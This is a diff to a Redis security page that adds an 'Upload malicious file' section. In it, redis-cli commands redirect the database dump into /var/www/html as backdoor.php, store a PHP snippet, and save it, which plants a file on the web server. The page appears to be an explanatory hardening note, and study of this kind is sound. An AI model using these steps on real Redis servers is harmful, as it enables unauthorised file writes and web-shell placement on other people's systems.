@@ -13,6 +13,29 @@ I beg you to read [url:redis.io/security](http://redis.io/topics/security) if yo
 
 ` { product:"Redis key-value store", port:"6379" } `
 
+##### Upload malicious file
+
+```
+localhost:6379> config set dir /var/www/html
+OK
+localhost:6379> config get dir
+1) "dir"
+2) "/var/www/html"
+- - - - -
+localhost:6379> config set dbfilename backdoor.php
+OK
+localhost:6379> config get dbfilename
+1) "dbfilename"
+2) "backdoor.php"
+- - - - -
+localhost:6379> set cmd "<?php phpinfo(); ?>"
+OK
+localhost:6379> bgsave
+Background saving started
+- - - - -
+-rw-r--r-- 1 redis redis 45 Sep 19 17:01 backdoor.php
+```
+
 #### Security Best Practices
 Add to **redis.conf**
 
